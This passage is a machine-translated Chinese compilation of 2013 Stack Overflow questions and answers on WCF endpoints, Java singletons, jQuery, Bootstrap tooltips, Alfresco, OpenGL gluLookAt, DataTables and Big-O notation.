代码应该放在 AJAX 回调函数的末尾。

正如另一个答案所提到的，这种说法可能是错误的：

```
if (order_index[order_index[parent_id]]) 
```

这可能只是一个错字，但可能正确的代码是：

```
if (order_index[parent_id]) 
```

# wcf - 部署在服务器上时，端点未从 clientconfig 读取

> ID：14847658
> 
> 赞同：0
> 
> 时间：2013-02-13T06:21:36.533
> 
> 标签：wcf, silverlight

我正在尝试从我的代码中的 servicereferences.clientconfig 文件中读取端点，如下所示：

```
public BaseRepository()
    {
        _proxy = new MyServiceClient("BasicHttpBinding_IMyService");
        this.binding = (BasicHttpBinding)_proxy.Endpoint.Binding;
        this.endpoint = _proxy.Endpoint.Address;
    } 
```

这里“BasicHttpBinding_IMyService”是我在 Servicereferences.ClientConfig 中定义的端点的名称。

```
<configuration>
<system.serviceModel>
    <bindings>
        <basicHttpBinding>
            <binding name="BasicHttpBinding_IMyService" maxBufferSize="2147483647"
                maxReceivedMessageSize="2147483647">
                <security mode="Transport" />
            </binding>
        </basicHttpBinding>
    </bindings>
    <client>

        <endpoint address="https://xxx/myservice.svc?wsdl"
            binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IMyService"
            contract="IMyserviceContract" name="BasicHttpBinding_IMyService" />
    </client>

</system.serviceModel> 
```

当我在本地运行它时它工作正常，但当我在服务器上部署它时它不起作用。我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:49:05.537

我认为您的服务器是 HTTPS SSL 安全服务器。

如果是这样，您应该通过对代码进行小的修改来解决它。

在您的绑定中有一个**EndpointAdrress**，我记得上面有一个**Protocol**属性，它可以是**"http"**或**"https"**。

如果其 https，绑定具有**SecurityMode**选项，则应将其设置为SSL 使用的**传输。**

对于其他情况，您应该在 web.config 中打开跟踪

```
 <configuration>
 <system.diagnostics>
  <sources>
        <source name="System.ServiceModel" 
                switchValue="Information, ActivityTracing"
                propagateActivity="true">
        <listeners>
           <add name="traceListener" 
               type="System.Diagnostics.XmlWriterTraceListener" 
               initializeData= "c:\log\Traces.svclog" />
        </listeners>
     </source>
  </sources> 
```

然后调用您的服务并使用**SvcTraceViewer.exe打开您的****c:\log\Traces.svclog** 检查红色日志。

 **希望有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T09:13:50.277

每当您从配置中读取端点配置时，它将采用您在添加服务引用期间所做的所有默认设置。默认配置包含如下 URI，

```
<binding name="BasicHttpBinding_IWorkbenchService1" maxBufferSize="2147483647"
                maxReceivedMessageSize="2147483647">
                <security mode="None" />
            </binding> 
```

上面的配置将您的本地服务器作为 URI，因此只允许它在您的本地机器上运行。

如果您想将其部署到其他服务器，则需要指定正确的 URI 来定位您的服务器，如果您在创建代理期间包含以下代码，则可以做到这一点。

```
Uri uri = null;
                if (!System.ComponentModel.DesignerProperties.IsInDesignTool)
                {
                    hostName = HtmlPage.Document.DocumentUri.Host;
                    portNo = HtmlPage.Document.DocumentUri.Port;
                    if (hostName == "localhost")
                    {

                        uri = new Uri("http://localhost:2700/xyz.svc");

                    }
                    else
                    {
                        uri = new Uri("http://" + hostName + ":" + portNo.ToString() + "/WebService/xyz.svc");
                    }
                }
                else
                {
                    uri = new Uri("http://localhost:2700/xyz.svc");
                }

                _proxy = new xyzClient(binding, new EndpointAddress(uri));
                _proxy.Endpoint.Binding.CloseTimeout = new TimeSpan(01, 20, 10);
                _proxy.Endpoint.Binding.ReceiveTimeout = new TimeSpan(01, 20, 10);
                _proxy.Endpoint.Binding.SendTimeout = new TimeSpan(01, 20, 10);
                _proxy.Endpoint.Binding.OpenTimeout = new TimeSpan(01, 20, 10);

                return _proxy;
            } 
```

希望这能回答你的问题。**

# java - Java - 无法在静态类中声明对象

> ID：14847659
> 
> 赞同：0
> 
> 时间：2013-02-13T06:21:40.080
> 
> 标签：java, singleton, static-methods

我正在尝试为 System 类实现单例模式。我发现的示例无法编译（例如[http://www.tutorialspoint.com/java/java_using_singleton.htm](http://www.tutorialspoint.com/java/java_using_singleton.htm)）。非静态类中有一个静态方法。所以我将类设为静态，一切都很好，直到我尝试为我的 Timer 类创建一个成员变量。

现在我收到消息“无法访问 Scene_3d 类型的封闭实例。必须使用封闭实例来限定分配......

我四处搜索，但没有人为我编译单例模式。顺便说一句，我正在使用处理（Java IDE/扩展）。有关如何解决此问题的任何想法都会有很大帮助。谢谢！

```
static public class DemoSystem {
  private static DemoSystem instance = null;  
  protected DemoSystem() {}

  public static DemoSystem Inst() {
    if( instance == null ) {
      instance = new DemoSystem();
    }
    return instance;
  }

  void init() {
    Timer timer = new Timer();  
  }

  int getTime() {
    return timer.elapsedTime;
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:26:35.840

标准的单例模式是有一个`private`构造函数和一个静态实例变量，所以：

```
public class DemoSystem {
  private static DemoSystem instance = null;
  private Timer timer;
  protected DemoSystem() {}

  public static DemoSystem Inst() {
    if( instance == null ) {
      instance = new DemoSystem();
    }
    return instance;
  }

  void init() {
    timer = new Timer();  
  }

  int getTime() {
    return timer.elapsedTime;
  }
} 
```

修复导入后，这应该可以正常工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:24:48.497

定时器在 init 中声明。它必须在类中，以便 get 方法可以访问它，例如：

```
static public class DemoSystem {
  private static DemoSystem instance = null;
  private Timer timer;
  protected DemoSystem() {}

  public static DemoSystem Inst() {
    if( instance == null ) {
      instance = new DemoSystem();
    }
    return instance;
  }

  public void init() {
    timer = new Timer();  
  }

  public int getTime() {
    return timer.elapsedTime;
  }
} 
```

您还缺少这两种方法的公共限定符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:26:22.810

我认为您不能将整个类声明为静态的：

```
static public class DemoSystem { 
```

应该：

```
public class DemoSystem { 
```

此外，没有 100%，可能有语法错误（您缺少分号...）：

```
 protected DemoSystem() {} 
```

应该

```
 protected DemoSystem() {}; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T06:32:17.923

首先，我认为顶级类不能是静态的，最初没有嵌套类，你不能将静态添加到任何类。

所以以下是无效的

```
static public class DemoSystem {

 ...
} 
```

你要改变的是喜欢

```
public class DemoSystem {
  private static DemoSystem instance = null;
  private Timer timer;
  protected DemoSystem() {}

  public static DemoSystem Inst() {
    if( instance == null ) {
      instance = new DemoSystem();
    }
    return instance;
  }

  void init() {
    timer = new Timer();  
  }

  int getTime() {
    return timer.elapsedTime;
  }
 } 
```

最好`Enum`用于单例。来自 **“有效的 Java”**

> “这种方法在功能上等同于公共领域方法，只是它更简洁，免费提供序列化机制，并提供针对多次实例化的铁定保证，即使面对复杂的序列化或反射攻击。虽然这种方法有尚未被广泛采用，**单元素枚举类型是实现单例的最佳方式。** ”

所以使用`Enum`你的类看起来像：

```
public enum DemoSystem {
    INSTANCE;
    private Timer timer;
    void init() {
       timer = new Timer();  
     }

    int getTime() {
       return timer.elapsedTime;
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-13T11:45:46.927

有一些与发布的原始代码片段相关的要点。

1.  首先顶级类不能声明为静态的。

2.  您创建的公共方法（ public static DemoSystem Inst() ）不能保证它只会在并发的情况下创建单例对象。为此，仅在声明时初始化对象，例如： private static DemoSystem instance = new DemoSystem();

或正确同步方法。

1.  制作 Timer 定时器，一个类级别的变量。

2.  什么是 timer.elapsedTime 。我认为 Timer 类中没有任何此类属性。如果您使用不同的 api ，请进行必要的导入。

所以最终的代码将如下所示：

```
import java.util.Timer;

public class DemoSystem {
    // Declared the variable at class level.
    Timer timer = null;

    // Initializing the object here only.
    private static DemoSystem instance = new DemoSystem();

    // Made the constructer private.
    private DemoSystem() {
    }

    // Static method to get singleton instance
    public static DemoSystem Inst() {
        return instance;
    }

    void init() {
        timer = new Timer();
    }

    int getTime() {
        //commented the statement so to compile the class  
        //return timer.elapsedTime;
        return 1;
    }
} 
```

# facebook - Open Graph 对象与元信息不匹配

> ID：14847662
> 
> 赞同：1
> 
> 时间：2013-02-13T06:21:44.653
> 
> 标签：facebook, facebook-opengraph, meta

我正在尝试更新 Facebook 与我的网站关联的图像。我已经编辑了我的元标记并运行了 FB 的[lint 实用程序](https://developers.facebook.com/tools/debug/og/object?q=thegurucircle.com)。但是，虽然没有显示错误，但“原始打开图形文档信息”下显示的 og:image 与“对象属性”下的 og:image 不匹配。我错过了一步还是做错了其他事情？

# javascript - 从 WP3.5 Media Uploader 获取新上传图片的 URL

> ID：14847668
> 
> 赞同：0
> 
> 时间：2013-02-13T06:22:27.667
> 
> 标签：javascript, jquery, wordpress, wordpress-3.5

我在使用来自媒体上传器的新上传图片时遇到问题。

我正在使用[自定义上传框架和一些简单的 jQuery，如此处所示](http://pastebin.com/EeiHHYSW)。

正如您在第 49 行看到的，我希望获取所选图像的缩略图大小的 URL，并在选择后将它们显示在页面上。

该代码工作正常......对于从媒体库中选择的先前上传的文件。

但是，附件对象（请参阅第 52 行的控制台日志）正在返回一个空对象，其大小未定义，用于新上传的文件。如果我单击，关闭并重新打开媒体上传框架，我可以让它工作，但对于一个功能性应用程序来说，这是一个失败。

我录制了[这段视频以帮助了解发生了什么](http://screenr.com/PSD7)。

我真诚地希望有人至少能在这个问题上给我指点，因为我一直在尝试解决它一段时间，但没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:57:35.857

事实证明，媒体上传器在上传新文件时会在列表中抛出一个空对象......我在上面的代码中遇到并修复了这个问题，也是导致此目的问题的原因。

我能够通过添加一个 if 语句来排除该空对象来解决我的问题：

```
// Show Thumbs
var attachment_thumbs = selection.map( function( attachment ) {
  attachment = attachment.toJSON();
  if( attachment.id != '' ) { return '<img src="' + attachment.sizes.thumbnail.url + '" id="id-' + attachment.id + '" />'; }
}).join(' ');
$('#images-feedback').show();
$('#thumbs').html(attachment_thumbs); 
```

虽然这解决了我的问题，但我仍然很好奇为什么媒体上传器在新上传的媒体之前包含一个空对象......

# arrays - actionscript 3中的简单数组帮助

> ID：14847669
> 
> 赞同：0
> 
> 时间：2013-02-13T06:22:33.550
> 
> 标签：arrays, actionscript-3

我正在做一个程序，我正在通过数组创建实例，但我不确定以后如何摆脱它们..为了更清楚地解释这里是我的代码：

（我很快就举了一个例子……所以这就是为什么代码中只有一个变量）

```
for (var q:int = 0; q < caw1.length; q++)
{
    addChild(caw1[q]);
    caw1[q].x = 9;
    caw1[q].y = 833;
}

half2.addEventListener(MouseEvent.CLICK, nxt2);
function nxt2(e:MouseEvent)
{
            removeChild(half2);
    removeChild(caw1[1]);
    half2.removeEventListener(MouseEvent.CLICK, nxt2);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:30:56.143

再次循环它们有什么问题？

```
function nxt2(e:MouseEvent)
{
    removeChild(half2);
    for (var i:int = 0; i < caw1.length; i++) {
        removeChild(caw[i]);
    }
    half2.removeEventListener(MouseEvent.CLICK, nxt2);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:51:56.953

FP 11 之后，又增加了一个新方法。那就是[`removeChildren()`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#removeChildren%28%29)。使用 a`removeChildren()`而不是使用 for 循环`removeChild()`。更合理。

> 从 DisplayObjectContainer 实例的子列表中删除所有子 DisplayObject 实例。已删除子项的 parent 属性设置为 null ，如果不存在对子项的其他引用，则对对象进行垃圾回收。
> 
> 垃圾收集器重新分配未使用的内存空间。当某个变量或对象不再被主动引用或存储在某处时，如果没有其他对它的引用，垃圾收集器会扫描并清除它曾经占用的内存空间。

试试这个：

```
function nxt2(e:MouseEvent)
{
    removeChild(half2);
    removeChildren(0,caw1.length-1);
    half2.removeEventListener(MouseEvent.CLICK, nxt2);
} 
```

# javascript - Jquery：删除父列表项的 href 属性

> ID：14847673
> 
> 赞同：0
> 
> 时间：2013-02-13T06:22:44.113
> 
> 标签：javascript, jquery, list

`<ul>`我有一个由嵌套在几个 s 中的几个s组成的菜单`<li>`。例如：

```
<ul>
<li><a href="somewhere.html">Item 1</a></li>
<li><a href="somewhere.html">Item 2</a></li>
<li><a href="somewhere.html">Item 3</a>
  <ul>
    <li><a href="somewhere.html">Sub Item 1</a></li>
    <li><a href="somewhere.html">Sub Item 2</a></li>
  </ul>
</li>
</ul> 
```

对于`<li>`带有嵌套`<ul>`s 的 s，我想`href`用 # 替换它们的属性，例如：

```
<li><a href="somewhere.html">Item 2</a></li>
<li><a href="#">Item 3</a>
      <ul>
        <li><a href="somewhere.html">Sub Item 1</a></li> 
```

我已经编写了这个脚本来做到这一点，但它似乎会影响两个列表中的所有标签。

```
$.each($("#menu ul li"), function() {
  if($(this).has("ul")){
   $(this).find("a").attr("href", "#");
  };
}); 
```

想知道是否有人可以告诉我我哪里出错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:27:34.557

查找嵌套`<ul>`元素，导航到其父元素，`<li>`选择其中的元素，然后`<a>`更改`href`.

```
$('li > ul').parent().children('a').attr('href', '#'); 
```

* * *

至于为什么您的代码不起作用，这是由于两个主要问题。首先，[`find`](http://api.jquery.com/find)遍历所有层级的后代。你实际上想要做的只是遍历第一级后代，所以使用[`children`](http://api.jquery.com/children). 其次，[`has`](http://api.jquery.com/has)（非直观）不返回布尔值，它只是将匹配的集合过滤为必要的元素（因此在 an 中使用它`if`是没有意义的，因为任何非空对象的计算结果都是 true）。更正后，您的代码将显示为：

```
$("#menu ul li").has("ul").children("a").attr("href", "#"); 
```

这些方法中的任何一种都可以满足您的需求，但第二种方法更直接，因此可能会产生更好的性能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:27:43.340

检查 dom 是否有像下面这样的孩子。

```
$(this).children('ul').length
```

在您的代码中，如果您正在检查使用的条件`.has`

**测试工作代码**

```
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript">

    $(function()
    {
        $.each($("#menu ul li"), function()
        {
            if($(this).children('ul').length > 0)
            {
                $(this).find("a").attr("href", "#");
            };
        });
    });

</script>

<ul>
    <li><a href="somewhere.html">Item 1</a></li>
    <li><a href="somewhere.html">Item 2</a></li>
    <li><a href="somewhere.html">Item 3</a>
      <ul>
        <li><a href="somewhere.html">Sub Item 1</a></li>
        <li><a href="somewhere.html">Sub Item 2</a></li>
      </ul>
    </li>
</ul>
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T07:09:02.337

这会很好：http: [//jsfiddle.net/H8JDy/](http://jsfiddle.net/H8JDy/)

```
$('#menu ul li > ul').siblings('a').attr('href', '#'); // <---this does the trick 
```

正如**nbrooks评论的那样** *`there's no reason for it to be wrapped in the loop`*

# alfresco - 如何在露天共享内容模型中获取列表约束的允许值？

> ID：14847681
> 
> 赞同：3
> 
> 时间：2013-02-13T06:23:18.857
> 
> 标签：alfresco, alfresco-share

很久以来我一直在努力实现这一目标，最后我在这里提出一个问题。

我在 alfresco 中创建了一个自定义内容模型，我可以通过共享成功使用它。此内容模型用于 html 表单提交。用户可以输入详细信息并成功保存。

现在，我有另一个要求。此表单中很少有字段是下拉列表，指的是我们在内容模型 XML 文件中有**List Constraint 。**不知何故，我想获取允许值列表并在**FTL**文件中使用它来填充下拉选项。我尝试了很多来寻找解决方案，但我在露天的有限知识无法找到解决方案。

非常感谢任何形式的帮助...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T11:37:02.343

编写一个基于 java 的存储库 webscript，查询 alfresco DictionaryService 以获取约束列表并将其公开为 json 或 xml 以供您的表单使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-06T14:55:00.160

正如@billerby 所说，您必须使用基于 java 的存储库 webscript 来获取值。

您可以使用此代码

```
serviceRegistry.getDictionaryService().getConstraint(constraintQName).getConstraint().getParameters().get(ListOfValuesConstraint.ALLOWED_VALUES_PARAM); 
```

您将获得`List<String>`所有允许的值。

# twitter-bootstrap - 如何将引导工具提示元素附加到指定元素

> ID：14847683
> 
> 赞同：0
> 
> 时间：2013-02-13T06:23:20.137
> 
> 标签：twitter-bootstrap, tooltip, angular-ui

由于从 DOM 中删除触发它的元素时，Bootstrap 工具提示仍然存在（参见[https://github.com/twitter/bootstrap/issues/3647](https://github.com/twitter/bootstrap/issues/3647)和[https://github.com/twitter/bootstrap/issues/2298](https://github.com/twitter/bootstrap/issues/2298)） ，当我在我的应用程序中遇到此问题时，我希望将工具提示元素附加到我知道将被删除的元素。[文档](http://twitter.github.com/bootstrap/javascript.html#tooltips)提到了一个选项`container`，但我似乎无法让它工作。我不确定到底该把什么作为价值。我尝试使字符串成为 jQuery 选择器（例如“#MY_ELEMENT_ID”），但它一直将工具提示附加到正文。这个选项期望什么价值？

作为旁注，我正在通过[Angular-UI](http://angular-ui.github.com/)设置此选项。所以，像这样：

```
myModule.value('ui.config', {
    jq: {
        tooltip: {
            placement: "bottom",
            container: "#MY_ELEMENT_ID"
        }
    }
}); 
```

通过 Angular-UI 设置时，其他选项按预期工作，所以我认为问题不存在。我只是不确定要设置什么值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:37:23.630

我终于回过头来看看这个，结果发现我们使用的是没有这个选项的旧版本的引导程序。我升级到最新版本，现在可以正常工作了。我很抱歉在发布问题之前没有注意到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T08:39:01.073

您可以尝试编写一个自定义实现，在范围被销毁时删除工具提示（您甚至可以收听广播）。

```
$scope.$on('$destroy', function(){
  // unload tooltip
}); 
```

# java - 尝试根据类构造函数的风格构建 if else 语句

> ID：14847684
> 
> 赞同：0
> 
> 时间：2013-02-13T06:23:20.780
> 
> 标签：java, constructor

我有一个将 List 和另一个类对象作为参数的方法。我想根据传递给方法的类对象遍历列表。该类具有三个不同的构造函数。其中一个接受 Date 对象，另一个接受字符串，第三个接受整数。在我的方法中，我想根据正在使用的类对象使用哪个构造函数来做不同的事情。有没有办法做到这一点？有没有办法我可以做一个 if else 语句来检查正在使用的类对象的类型（基于构造函数）？

对于 CodeWarrior：以下是构造函数示例：

```
 public DateRange(Date date1, Date date2){

}

public DateRange(String string1, String string2){

}

public DateRange(int month, int year){

} 
```

然后说我有这样的方法：

```
public static List<Schedule> getSchedule(List<Schedule> schedules, DateRange dateRange) {
    List<Schedule> schedules = new ArrayList<Schedule>();
    for (Schedule scheduleTime : schedules){
        if 
```

我想设置方法来设计 if 语句以某种方式检查使用了哪种类型的 DateRange，并基于此做不同的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:07:34.570

我想这就是你要找的。

修改您的 DateRange 类，以便它可以告诉您它是如何创建的：

```
public class DateRange {
    private final Object obj1;
    private final Object obj2;
    public DateRange(Date date1, Date date2) {
        obj1 = date1;
        obj2 = date2;
    }
    public DateRange(String string1, String string2) {
        obj1 = string1;
        obj2 = string2;
    }
    public DateRange(int month, int year) {
        obj1 = Integer.valueOf(month);
        obj2 = Integer.valueOf(year);
    }
    public boolean isDate() { return obj1 instanceof Date; }
    public boolean isString() { return obj1 instanceof String; }
    public boolean isInt() { return obj1 instanceof Integer; }
} 
```

这是调用/检查语法：

```
public static List<Schedule> getSchedule(List<Schedule> schedules, DateRange dateRange) {
    for (Schedule scheduleTime : schedules) {
        if(dateRange.isDate()) {
            // Do something based on the Date constructor.
        } else if(dateRange.isString()) {
            // Do something based on the String constructor.
        } else if(dateRange.isInt()) {
            // Do something based on the int constructor.
        }
    }
    return schedules;
} 
```

需要进一步修改`DateRange`类的另一个选项是使用继承来创建`DateRange`基于构造函数类型的类族。基`DateRange`类将有一个抽象方法，类似于`doSomething()`将由每个继承`DateRangeDate`的`DateRangeString`、 和`DateRangeInt`类提供。然后，您甚至可能不必在迭代中处理 if 树。

我希望这有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:32:04.210

我不确定您是否可以获得用于实例化对象的构造函数类型...但是您可以做的是在每种类型的构造函数中设置一个特定参数，您稍后将检查。例如，您可以为每个构造函数设置一个布尔变量（最初均为 false）。如果调用了某个构造函数，请将其各自的变量设置为 true。或者，将整数字段设置为每个构造函数的特定数字，然后检查该字段的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:08:08.113

JVM 不会存储用于实例化对象的构造函数版本。这是您必须以某种方式存储并相应编码的一些信息。对于您发布的示例，试试这个

```
//DateRange.java

public class DateRange{

    private int constructorType;

    public DateRange(Date date1, Date date2){
         constructorType = 1;
    }

    public DateRange(String string1, String string2){
         constructorType = 2;
    }

    public DateRange(int month, int year){
        constructorType = 3;
    }

    public int getConstructorType(){
          return constructorType;
    }
} 
```

这是 getSchedule() 函数：

```
 public static List<Schedule> getSchedule(List<Schedule> schedules, DateRange dateRange) {
    List<Schedule> schedules = new ArrayList<Schedule>();
    for (Schedule scheduleTime : schedules){

        //use switch instead of if
        switch(dateRange.getConstructorType()){
           case 1: System.out.println("First constructor was called"); break;
           case 2: System.out.println("Second constructor was called"); break;
           case 3: System.out.println("Third constructor was called"); break;
           default: System.err.println("Something is wrong. Unknown constructor type"); break;
        }
    }
} 
```

# javascript - Chrome 中的 AJAX 下拉菜单（HTML 选择）

> ID：14847687
> 
> 赞同：0
> 
> 时间：2013-02-13T06:23:49.337
> 
> 标签：javascript, jquery, ajax, google-chrome

我有以下选择选项代码：

```
 <select name="startTime" id = "startTime" onchange = "javascript:timeChange();">

                    <c:choose>
                            <c:when test="${param.cid != null}">
                                    <option value="<c:out value="${timevalue}"/>" selected><c:out value="${time}" /></option>
                                    <option value="<c:out value="-"/>"><c:out value="Choose time"/></option>
                            </c:when>
                            <c:otherwise>
                                    <option value="<c:out value="-"/>" selected><c:out value="Choose time" /></option>
                            </c:otherwise>
                    </c:choose>
                    <option value="10:00:00" >10:00</option>
                    <option value="11:00:00" >11:00</option>
                    <option value="12:00:00" >12:00</option>
                    <option value="13:00:00" >13:00</option>
                    <option value="14:00:00" >14:00</option>
                    <option value="15:00:00" >15:00</option>
                    <option value="16:00:00" >16:00</option>
                    <option value="17:00:00" >17:00</option>
                    <option value="18:00:00" >18:00</option>
                    <option value="19:00:00" >19:00</option>
                    <option value="20:00:00" >20:00</option>
                    <option value="21:00:00" >21:00</option>
               </select> 
```

并且还有以下ajax代码：

```
 $.ajax({
            url: "temporary_checking.jsp",
            type: "POST",
            data: data,
            async: true,
            timeout:6000,
            dataType: "html",
            success: function (data) {
                    data = data.trim();
                    var n = data.indexOf("ERROR",0);
                    if( n > -1 ){
                            if(data.indexOf("ERROR 2",0) >= 0 ){
                                    alert("Error to allocate time slot");
                                    return true;
                            }
                    }else{
                            window.location.reload(false);
                            if(getCookie('Times') != null || getCookie('Times') != undefined)
                            {
                                    deleteCookie('Times');
                            }
                            setCookie('reload',1,'');
                            setCookie('zerosecond',1,'');
                    }
            },
            error: function(XMLHttpRequest, textStatus, errorThrown){
                    document.getElementById('startTime').value = "-";
                    alert("Error to book time slot : " + textStatus + '\n ' + errorThrown);
                    return false; 
            }
        }); 
```

因此，问题是每当它选择一个选项时，例如 17:00，那么该值将恢复为默认值，即“选择时间”选项。但是，它在 FireFox 上没有问题。有什么解决办法吗？提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T22:46:51.467

如果你调用函数“window.location.reload(false);” 页面将立即重新加载，所有 JS 状态都将丢失，并且该语句之后的代码行将不会执行。所以最好在重新加载之前设置cookie：

```
...

} else {
    if (getCookie('Times') != null || getCookie('Times') != undefined) {
        deleteCookie('Times');
    }
    setCookie('reload',1,'');
    setCookie('zerosecond',1,'');
    window.location.reload();
}
... 
```

“false”参数对我来说没有意义，因为它是默认值： [http ://www.w3schools.com/jsref/met_loc_reload.asp](http://www.w3schools.com/jsref/met_loc_reload.asp)

# opengl - gluLookat 在免费相机的情况下

> ID：14847688
> 
> 赞同：2
> 
> 时间：2013-02-13T06:23:58.970
> 
> 标签：opengl

我正在尝试在 3D 空间中制作免费的旅行相机。glulookat 函数如下所示：

```
 gluLookAt(g_eye[0],g_eye[1],g_eye[2],
           g_look[0],g_look[1],g_look[2],
           0,1.0,0    
        ); 
```

前三个坐标只是相机位置。最后三个坐标是关于相机的旋转。

似乎第二个三个坐标是关于相机正在看的地方。

但我真的不明白为什么我们需要第二个三个坐标。这将如何影响我们的观点？

例如：如果相机从原点开始，则相机向右旋转 30 度，然后在 -Z 方向平移 10。然后我知道相机现在在哪里。但是我应该在第二个三个坐标中放入什么？

1.  原点相机 ![在此处输入图像描述](../Images/c4e65f690f7face0ac584182042286b4.png)

2.  在某种程度上右转![在此处输入图像描述](../Images/255da20f092888dd7e0f05853b9f2136.png)

3.  前进 ![在此处输入图像描述](../Images/1319db7d7146dbe981b02471795120df.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:05:05.753

> 但我真的不明白为什么我们需要第二个三个坐标。这将如何影响我们的观点？

您的头部位于前 3 个参数中的坐标处。

您在阅读本文时正在查看的对象是屏幕，第二个 3 个参数

对于您目前阅读的向上向量的文本，最后一个参数接近 (0, 1, 0) 现在阅读以下内容：

![在此处输入图像描述](../Images/b303c88d1d1fc12cf25714146d9f3e2e.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T06:43:07.980

*眼睛*的位置（前三个坐标）和*视点*（后三个）定义了*视线*。最后三个坐标，*向上*向量，用于确定围绕视线的旋转角度。OpenGL中的旋转需要一个轴来旋转，这就是前两组坐标的原因。在[此处](http://www.glprogramming.com/red/chapter03.html)查看有关在 OpenGL 中查看转换的详细信息。

# jquery - 如何在jquery数据表中设置对应值的值

> ID：14847690
> 
> 赞同：0
> 
> 时间：2013-02-13T06:24:02.640
> 
> 标签：jquery, ajax, model-view-controller, datatables

我创建了 mvc 格式的数据表。但是在加载脚本时，它与表数据不匹配，并且不绑定在我的表行中。我的代码如下。

```
$.ajax({ 
    // my passing value
    success: function (data) { // i get the data properly 
        $('#Table').dataTable().fnClearTable();
        $.each(data, function (k, v) {
            var ID= v.ID;
            var name= v.name;
            var batch= v.batch;

            $('#Table').dataTable().fnAddData([
                ID,
                name,
                batch
            ]);
        });
    }
}); 
```

我的桌子：

```
<table id="Table" width="100%">
    <thead>
        <tr>
            <th>EMP_ID</th>
            <th>EMP_name</th>
            <th>EMP_batch</th>
        </tr>
    </thead>
    <tbody></tbody>
</table> 
```

数据表：[http ://www.datatables.net/](http://www.datatables.net/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:10:42.927

您问题的关键是您的 AJAX 请求的响应。确保它是由对象数组组成的正确 JSON 对象。像这样：

```
[
    {
        "ID": 123,
        "name": "slim shady",
        "batch": "smack my batch up"
    },
    {
        "ID": 321,
        "name": "eddie vedder",
        "batch": "yellow ledbetter"
    }
] 
```

您的 JavaScript 工作正常：http: [//jsfiddle.net/upSvJ/](http://jsfiddle.net/upSvJ/)

# math - 大 O 表示法中的指数

> ID：14847693
> 
> 赞同：3
> 
> 时间：2013-02-13T06:24:17.343
> 
> 标签：math, big-o, asymptotic-complexity

3 ^n = O(2 ^n ) 吗？(3/2) ^n = O(2 ^n ) 怎么样？你能解释一下答案吗？

我第一次弄错了，因为无论你将 2 ^(n乘以什么常数 C，3) ^n的增长速度都比 2 ^n快。第二个也一样？

log(3 ^n ) = O(log (2 ^n ) ) 怎么样？我认为我们无法确定这一点，因为我们不知道日志的基础。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T06:44:36.340

让我们实际证明一个更强的结果：对于任何常数 r [0]和 r [1]，其中 1 ≤ r [0] < r [1]，r [0] ^n = O(r [1] ^(n ) 是真的，r) [1] ^n = r [0] ^n是假的. 这证明了您的结果是一种特殊情况，因为 1 < 3/2 < 2。

为了证明第一部分，我们将证明 r [0] ^n = O(r [1] ^n )。为此，我们将使用 big-O 的定义并找到 n [0]和 c 的值，这样对于任何 n > n [0]，我们都有

> r [0] ^n ≤ cr [1] ^n

我们可以选择 n = n [0]并且可以选择 c = 1。然后上面的不等式成立，所以根据定义我们有 r [0] ^n = O(r [1] ^n )。

为了证明第二部分，我们将证明 r [1] ^n ≠ O(r [0] ^n )。为此，我们将通过矛盾进行。为了矛盾起见，假设存在 c 和 n [0]的选择，使得对于任何 n > n [0]，我们有

> r [1] ^n ≤ cr [0] ^n

取双方的log得到

> n log r [1] ≤ log (cr [0] ^n )
> 
> n log r [1] ≤ log c + n log r [0]
> 
> n (log r [1] - log r [0] ) ≤ log c
> 
> n log(r [1] / r [0] ) ≤ log c
> 
> n ≤ log c / (log(r [1] / r [0] ))

但是现在我们遇到了麻烦，因为这个陈述应该适用于n的任何选择。但是，如果我们选择任何大于 log c / (log(r [1] / r [0] )) 的 n，则该陈述变为错误。

我们遇到了矛盾，所以我们的假设一定是错误的。因此，如果 1 < r [0] < r [1]，我们有 r [1] ^n ≠ O(r [0] ^n )。

希望这可以帮助！

# html - 英雄单位显示不正确

> ID：14847697
> 
> 赞同：0
> 
> 时间：2013-02-13T06:24:25.670
> 
> 标签：html, css, twitter-bootstrap

我不能让这个英雄单元像在[http://twitter.github.com/bootstrap/examples/hero.html#](http://twitter.github.com/bootstrap/examples/hero.html#)上使用这个原始 CSS 移动中心 -

```
.hero-unit {
  padding: 60px;
  margin-bottom: 0px;
  font-size: 18px;
  font-weight: 200;
  line-height: 30px;
  color: inherit;
  background-color: #eeeeee;
  border:1px solid #cacaca;
  -webkit-border-radius: 10px;
     -moz-border-radius: 10px;
          border-radius: 10px;
} 
```

看看我在[http://www.magnixsolutions.com/dev/test/test.html上做了什么](http://www.magnixsolutions.com/dev/test/test.html)

我的 CSS 与下面的原始文件相同。我不明白发生了什么事。

```
